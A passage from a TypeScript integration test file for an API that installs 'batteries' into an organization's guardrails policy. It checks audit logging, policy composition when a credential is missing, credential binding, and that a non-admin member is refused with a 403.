        .from(schema.auditLogsTable)
        .where(eq(schema.auditLogsTable.organizationId, organizationId))
    ).filter(
      (record) =>
        record.action.startsWith("openappaBatteryInstall") &&
        record.httpStatus === 200,
    );
    // Every write the organization-wide row answered names it.
    expect(
      records.map((record) => [record.action, record.resourceId]).sort(),
    ).toEqual([
      ["openappaBatteryInstall.created", row.id],
      ["openappaBatteryInstall.deleted", row.id],
      ["openappaBatteryInstall.updated", row.id],
    ]);
  });

  test("an organization-wide battery missing its credential still composes, so a rule routing to it keeps the policy open", async ({
    makeInternalMcpCatalog,
    makeTool,
  }) => {
    const catalog = await makeInternalMcpCatalog({
      organizationId,
      name: "Acme prod",
    });
    await makeTool({
      catalogId: catalog.id,
      name: "acme_prod__list",
      rawName: "list",
    });
    const uploaded = await app.inject({
      method: "PUT",
      url: "/api/openappa/battery-packages/acme",
      payload: { files: sharedNamespacePackage("acme", "list") },
    });
    expect(uploaded.statusCode, uploaded.body).toBe(200);
    for (const payload of [
      {
        batteryName: "acme",
        catalogId: catalog.id,
        packageHash: uploaded.json().contentHash,
      },
      { batteryName: "jev" },
    ]) {
      const created = await app.inject({
        method: "POST",
        url: "/api/openappa/battery-installs",
        payload,
      });
      expect(created.statusCode, created.body).toBe(200);
    }
    const latest = await guardrailsPolicyService.get(organizationId);
    await guardrailsPolicyService.update({
      organizationId,
      userId: adminId,
      content: latest.content.replace(
        'name = "*"\nannotator = "noop"',
        'name = "*"\nannotator = "jev.tool-call"',
      ),
      expectedRevision: latest.revision,
    });
    await openappaBatteriesService.recompile(organizationId);

    const jevRow = (await installRows()).find(
      (install) => install.batteryName === "jev",
    );
    if (!jevRow) throw new Error("jev derived no row");
    // The helper is bound though it has no credential: it answers nothing,
    // which refuses the calls routed to it rather than the whole policy.
    const composed = await OpenAppaEffectivePolicyModel.find(organizationId);
    expect(composed?.lastError).toBeNull();
    expect(composed?.content).toContain(helperUrlBase(jevRow.id));
    expect(await declarations()).toMatchObject({
      lastError: null,
      batteries: expect.arrayContaining([
        expect.objectContaining({ name: "acme", status: "active" }),
        expect.objectContaining({
          name: "jev",
          status: "missing_credentials",
          composed: true,
        }),
      ]),
    });

    await RuntimeCredentialDefinitionModel.create({
      organizationId,
      createdBy: adminId,
      definition: {
        key: "jev-key",
        name: "Jev key",
        kind: "secret",
        description: "",
        icon: null,
        allowPersonal: false,
        allowOrganization: true,
      },
    });
    await RuntimeCredentialConnectionModel.upsert({
      organizationId,
      scope: "organization",
      userId: null,
      credentialId: "jev-key",
      value: "jev_test",
    });
    const bound = await app.inject({
      method: "PATCH",
      url: `/api/openappa/battery-installs/${jevRow.id}`,
      payload: { credentialBindings: { APPA_PROVIDER_JEV_API_KEY: "jev-key" } },
    });
    expect(bound.statusCode, bound.body).toBe(200);
    expect(bound.json()).toMatchObject({ status: "active", composed: true });
    expect(
      (await OpenAppaEffectivePolicyModel.find(organizationId))?.lastError,
    ).toBeNull();
  });

  test("a member without organization management cannot install", async ({
    makeUser,
    makeMember,
  }) => {
    const member = await makeUser();
    await makeMember(member.id, organizationId);
    const memberApp = createFastifyInstance();
    memberApp.addHook("onRequest", async (request) => {
      Object.assign(request, { user: member, organizationId });
    });
    await memberApp.register(routes);
    try {
      expect(
        (
          await memberApp.inject({
            method: "GET",
            url: "/api/openappa/batteries",
          })
        ).statusCode,
      ).toBe(200);
      expect(
        (
          await memberApp.inject({
            method: "POST",
            url: "/api/openappa/battery-installs",
            payload: {
              batteryName: "github",
              catalogId: "00000000-0000-0000-0000-000000000000",
            },
          })
        ).statusCode,
      ).toBe(403);
    } finally {
      await memberApp.close();
    }
  });
});
